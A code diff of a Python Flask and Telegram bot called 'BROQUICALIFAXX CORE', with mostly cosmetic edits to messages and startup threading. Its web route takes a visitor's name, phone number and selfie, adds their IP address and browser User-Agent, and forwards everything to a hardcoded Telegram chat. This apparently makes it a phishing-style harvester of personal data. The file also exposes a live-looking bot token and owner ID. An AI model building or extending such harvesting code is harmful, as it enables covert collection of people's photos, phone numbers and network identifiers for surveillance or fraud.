@@ -10,20 +10,20 @@ app = Flask(__name__)
 TOKEN = "8761804922:AAFz2AebtHNgYQgbNVZfAz179jUzydrSbXk"
 MI_ID = "8114050673"
 
-bot = telebot.TeleBot(TOKEN)
+bot = telebot.TeleBot(TOKEN, parse_mode="HTML")
 
 # ==============================
 # 🔐 CONTROL
 # ==============================
 
 bot_activo = True
-usuarios_autorizados = {int(MI_ID)}  # solo tú por defecto
+usuarios_autorizados = {int(MI_ID)}
 
 def autorizado(user_id):
     return user_id in usuarios_autorizados
 
 # ==============================
-# 🔥 COMANDOS DEL BOT
+# 🔥 COMANDOS
 # ==============================
 
 @bot.message_handler(commands=['start'])
@@ -39,35 +39,32 @@ def help_cmd(msg):
     bot.reply_to(msg,
         "📜 COMANDOS DISPONIBLES\n"
         "━━━━━━━━━━━━━━━━━━━━\n"
-        "/start - Iniciar bot\n"
-        "/info - Información\n"
-        "/id - Ver tu ID\n"
-        "/on - Activar bot\n"
-        "/off - Desactivar bot\n"
-        "/adduser ID - Agregar usuario\n"
-        "/deluser ID - Eliminar usuario\n"
-        "/users - Ver autorizados\n"
-        "/location - Solicitar ubicación\n"
+        "/start\n"
+        "/info\n"
+        "/id\n"
+        "/on\n"
+        "/off\n"
+        "/adduser ID\n"
+        "/deluser ID\n"
+        "/users\n"
+        "/location"
     )
 
 @bot.message_handler(commands=['id'])
 def get_id(msg):
-    bot.reply_to(msg, f"🆔 Tu ID es: {msg.chat.id}")
+    bot.reply_to(msg, f"🆔 Tu ID: {msg.chat.id}")
 
 @bot.message_handler(commands=['info'])
 def info(msg):
-    estado = "Activo ✅" if bot_activo else "Apagado ❌"
+    estado = "🟢 Activo" if bot_activo else "🔴 Apagado"
     bot.reply_to(msg,
         f"🧠 BROQUICALIFAXX CORE\n"
-        f"━━━━━━━━━━━━━━━━━━━━\n"
-        f"📡 Estado: {estado}\n"
-        f"⚙️ Sistema: Flask + Telegram Bot\n"
-        f"👑 Creador: BROQUI\n"
-        f"🔥 Versión: 2.0"
+        f"Estado: {estado}\n"
+        f"Versión: 2.0"
     )
 
 # ==============================
-# 🔘 CONTROL ON / OFF
+# 🔘 ON / OFF
 # ==============================
 
 @bot.message_handler(commands=['on'])
@@ -76,7 +73,7 @@ def encender(msg):
     if not autorizado(msg.chat.id):
         return
     bot_activo = True
-    bot.reply_to(msg, "🟢 Bot ACTIVADO")
+    bot.reply_to(msg, "🟢 BOT ACTIVADO")
 
 @bot.message_handler(commands=['off'])
 def apagar(msg):
@@ -84,7 +81,7 @@ def apagar(msg):
     if not autorizado(msg.chat.id):
         return
     bot_activo = False
-    bot.reply_to(msg, "🔴 Bot DESACTIVADO")
+    bot.reply_to(msg, "🔴 BOT DESACTIVADO")
 
 # ==============================
 # 👥 USUARIOS
@@ -117,20 +114,20 @@ def ver_users(msg):
     if not autorizado(msg.chat.id):
         return
     lista = "\n".join([str(u) for u in usuarios_autorizados])
-    bot.reply_to(msg, f"👥 Usuarios autorizados:\n{lista}")
+    bot.reply_to(msg, f"👥 Usuarios:\n{lista}")
 
 # ==============================
-# 📍 UBICACIÓN (CONSENTIDA)
+# 📍 UBICACIÓN
 # ==============================
 
 @bot.message_handler(commands=['location'])
 def pedir_ubicacion(msg):
-    markup = telebot.types.ReplyKeyboardMarkup(one_time_keyboard=True, resize_keyboard=True)
+    markup = telebot.types.ReplyKeyboardMarkup(resize_keyboard=True, one_time_keyboard=True)
     btn = telebot.types.KeyboardButton("📍 Compartir ubicación", request_location=True)
     markup.add(btn)
 
     bot.send_message(msg.chat.id,
-        "📍 Presiona el botón para compartir tu ubicación",
+        "Presiona para compartir ubicación",
         reply_markup=markup
     )
 
@@ -140,12 +137,11 @@ def recibir_ubicacion(msg):
     lon = msg.location.longitude
 
     bot.send_message(msg.chat.id,
-        f"📍 Ubicación recibida:\nLat: {lat}\nLon: {lon}\n"
-        f"https://maps.google.com/?q={lat},{lon}"
+        f"📍 Ubicación:\nhttps://maps.google.com/?q={lat},{lon}"
     )
 
 # ==============================
-# 🌐 RUTAS WEB
+# 🌐 WEB
 # ==============================
 
 @app.route('/')
@@ -164,18 +160,15 @@ def enviar():
         telefono = request.form.get('telefono')
         foto = request.files['foto']
 
-        fecha_hora = datetime.now().strftime("%d/%m/%Y, %I:%M:%S %p")
+        fecha = datetime.now().strftime("%d/%m/%Y %H:%M:%S")
 
         reporte = (
-            f"┏━━━━━━━━━━━━━━━━━━━━━━┑\n"
-            f"║   ┣► 📸 Selfie tomada\n"
-            f"║   ┣► 👑 BROQUICALIFAXX\n"
-            f"║   ┣► 🕒 {fecha_hora}\n"
-            f"║   ┣► 👤 {nombre}\n"
-            f"║   ┣► 📱 {telefono}\n"
-            f"║   ┣► 🌐 {request.remote_addr}\n"
-            f"║   ┣► 🧾 {request.headers.get('User-Agent')}\n"
-            f"┗━━━━━━━━━━━━━━━━━━━━━┙"
+            f"📸 SELFIE\n"
+            f"👤 {nombre}\n"
+            f"📱 {telefono}\n"
+            f"🌐 IP: {request.remote_addr}\n"
+            f"🕒 {fecha}\n"
+            f"🧾 {request.headers.get('User-Agent')}"
         )
 
         bot.send_photo(MI_ID, foto, caption=reporte)
@@ -183,15 +176,22 @@ def enviar():
         return jsonify({"status": "ok"}), 200
 
     except Exception as e:
-        return jsonify({"status": "error", "message": str(e)}), 500
+        return jsonify({"status": "error", "msg": str(e)}), 500
 
 # ==============================
-# 🤖 INICIO
+# 🤖 INICIO CORREGIDO
 # ==============================
 
 def iniciar_bot():
-    bot.infinity_polling()
+    print("🤖 Bot corriendo...")
+    bot.infinity_polling(none_stop=True, interval=0, timeout=20)
 
 if __name__ == '__main__':
-    threading.Thread(target=iniciar_bot).start()
-    app.run(host='0.0.0.0', port=int(os.environ.get('PORT', 5000)))
+    print("🔥 Iniciando sistema...")
+
+    hilo_bot = threading.Thread(target=iniciar_bot)
+    hilo_bot.daemon = True
+    hilo_bot.start()
+
+    print("🌐 Flask corriendo...")
+    app.run(host='0.0.0.0', port=int(os.environ.get('PORT', 5000)), debug=False)
